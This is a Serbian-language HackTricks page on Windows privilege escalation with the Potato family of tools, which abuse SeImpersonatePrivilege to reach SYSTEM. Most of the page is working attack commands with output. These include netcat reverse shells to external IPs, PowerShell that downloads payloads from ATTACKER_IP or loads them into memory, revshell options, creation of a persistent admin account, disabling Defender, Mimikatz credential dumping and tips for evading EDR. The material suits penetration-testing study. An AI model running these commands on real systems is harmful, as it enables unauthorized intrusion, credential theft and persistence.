# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne radi** na Windows Server 2019 i Windows 10 build 1809 i novijim verzijama. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu se koristiti za **iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`**. Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno obrađuje alat `PrintSpoofer`, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima, na kojima JuicyPotato više ne radi.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Moderna alternativa koja se često održava tokom 2024–2025. godine jeste SigmaPotato (fork alata GodPotato), koji dodaje upotrebu in-memory/.NET reflection mehanizama i proširenu podršku za OS. Pogledajte kratko uputstvo za korišćenje u nastavku i repo u odeljku References.

Povezane stranice sa pozadinskim informacijama i manuelnim tehnikama:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Zahtevi i uobičajene prepreke

Sve navedene tehnike oslanjaju se na zloupotrebu privilegovanog servisa koji podržava impersonation, iz konteksta koji poseduje jednu od sledećih privilegija:

- SeImpersonatePrivilege (najčešća) ili SeAssignPrimaryTokenPrivilege
- High integrity nije potreban ako token već poseduje SeImpersonatePrivilege (što je uobičajeno za mnoge service naloge, kao što su IIS AppPool, MSSQL itd.)

Brzo proverite privilegije:
```cmd
whoami /priv | findstr /i impersonate
```
Operativne napomene:

- Ako vaša shell sesija radi pod ograničenim tokenom bez SeImpersonatePrivilege (što je u nekim kontekstima uobičajeno za Local Service/Network Service), vratite podrazumevane privilegije naloga pomoću FullPowers, a zatim pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer zahteva da Print Spooler servis bude pokrenut i dostupan preko lokalne RPC krajnje tačke (spoolss). U ojačanim okruženjima u kojima je Spooler onemogućen nakon PrintNightmare-a, koristite RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato zahteva OXID resolver dostupan preko TCP/135. Ako je izlazni saobraćaj blokiran, koristite redirector/port-forwarder (pogledajte primer u nastavku). Starije verzije zahtevale su zastavicu -f.
- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedna cev blokirana, pokušajte sa alternativnim cevima (lsarpc, efsrpc, samr, lsass, netlogon).
- Greška 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznat/nepodržan RPC authentication service; pokušajte sa drugom cevi/transportom ili proverite da li ciljni servis radi.
- “Kitchen-sink” fork-ovi kao što je DeadPotato objedinjuju dodatne payload module (Mimikatz/SharpHound/Defender off) koji upisuju podatke na disk; očekujte veću EDR detekciju u poređenju sa slim originalima.

## Brza demonstracija

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Napomene:
- Možete koristiti `-i` da pokrenete interaktivni proces u trenutnoj konzoli ili `-c` da izvršite one-liner.
- Zahteva Spooler service. Ako je onemogućen, ovo neće uspeti.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ako je odlazni port 135 blokiran, usmerite OXID resolver preko socat-a na vašem redirector-u:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato je noviji COM abuse primitive objavljen krajem 2022. godine, koji cilja **PrintNotify** service umesto Spooler/BITS. Binary instancira PrintNotify COM server, zamenjuje ga lažnim `IUnknown` objektom, a zatim pokreće privilegovan callback kroz `CreatePointerMoniker`. Kada se PrintNotify service, koji radi kao **SYSTEM**, poveže nazad, process duplicira vraćeni token i pokreće prosleđeni payload sa potpunim privilegijama.<sup>[[13]](#references)</sup>

Ključne operativne napomene:

* Radi na Windows 10/11 i Windows Server 2012–2022, pod uslovom da je Print Workflow/PrintNotify service instaliran (prisutan je čak i kada je legacy Spooler onemogućen nakon PrintNightmare-a).
* Zahteva da calling context poseduje `SeImpersonatePrivilege` (uobičajeno za IIS APPPOOL, MSSQL i service account-e scheduled taskova).
* Prihvata ili direktnu komandu ili interactive mode, tako da možete ostati u originalnoj konzoli. Primer:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Pošto je u potpunosti zasnovan na COM-u, nisu potrebni named-pipe listeners niti external redirectors, što ga čini direktnom zamenom na hostovima gde Defender blokira RoguePotato-ovo RPC binding povezivanje.

Operateri poput Ink Dragon-a pokreću PrintNotifyPotato odmah nakon dobijanja ViewState RCE-a na SharePoint-u, kako bi izvršili pivot sa `w3wp.exe` worker process-a na SYSTEM pre instaliranja ShadowPad-a.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Savet: Ako jedan pipe ne uspe ili ga EDR blokira, pokušajte sa drugim podržanim pipe-ovima:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Napomene:
- Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutan SeImpersonatePrivilege.
- Preuzmite binarni fajl koji odgovara instaliranom runtime-u (npr. `GodPotato-NET4.exe` na modernom Server 2022).
- Ako je vaš početni execution primitive webshell/UI sa kratkim timeout-ima, postavite payload kao script i zatražite od GodPotato da ga pokrene umesto dugog inline command-a.<sup>[[12]](#references)</sup>

Brz staging pattern iz IIS webroot-a sa omogućenom mogućnošću upisa:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato pruža dve varijante usmerene na DCOM objekte servisa koji podrazumevano koriste RPC_C_IMP_LEVEL_IMPERSONATE. Izgradite ili koristite obezbeđene binaries i pokrenite svoju komandu:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ažurirani fork GodPotato)

SigmaPotato dodaje moderne pogodnosti poput izvršavanja iz memorije putem .NET reflection-a i PowerShell reverse shell helper-a.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Dodatne pogodnosti u izdanjima iz 2024–2025. (v1.2.x):
- Ugrađena opcija za reverse shell `--revshell` i uklanjanje ograničenja od 1024 karaktera za PowerShell, pa možete pokrenuti dugačke payload-e za zaobilaženje AMSI-ja odjednom.
- Sintaksa pogodna za reflection (`[SigmaPotato]::Main()`), uz rudimentarni trik za izbegavanje AV-a putem `VirtualAllocExNuma()`, kojim se mogu zbuniti jednostavni heuristički mehanizmi.
- Zaseban `SigmaPotatoCore.exe` kompajliran za .NET 2.0 okruženja sa PowerShell Core.

### DeadPotato (GodPotato rework iz 2024. sa modulima)

DeadPotato zadržava GodPotato OXID/DCOM impersonation lanac, ali ugrađuje pomoćne post-exploitation funkcije kako bi operatori mogli odmah da preuzmu SYSTEM privilegije i izvrše persistence/collection bez dodatnih alata.<sup>[[15]](#references)</sup>

Uobičajeni moduli (svi zahtevaju SeImpersonatePrivilege):

- `-cmd "<cmd>"` — pokretanje proizvoljne komande kao SYSTEM.
- `-rev <ip:port>` — brzi reverse shell.
- `-newadmin user:pass` — kreiranje lokalnog administratora za persistence.
- `-mimi sam|lsa|all` — preuzimanje i pokretanje Mimikatz-a radi dump-ovanja kredencijala (upisuje podatke na disk, primetno je).
- `-sharphound` — pokretanje SharpHound collection-a kao SYSTEM.
- `-defender off` — isključivanje Defender real-time protection-a (veoma primetno).

Primeri jednolinijskih komandi:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Pošto isporučuje dodatne binarne datoteke, očekujte više AV/EDR detekcija; kada je stealth važan, koristite kompaktniji GodPotato/SigmaPotato.

## Reference

- [1] [PrintSpoofer – Zloupotreba privilegija za impersonaciju na Windows 10 i Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Nema više JuicyPotato? Stara priča, dobrodošao RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Vraćanje podrazumevanih privilegija tokena za servisne naloge](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction do webroot RCE → FullPowers + GodPotato do SYSTEM-a](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato do SYSTEM-a](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Unutar operacije Ink Dragon: otkrivanje relay mreže i unutrašnjeg rada stealth ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – prerada GodPotato sa ugrađenim post-ex modulima](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
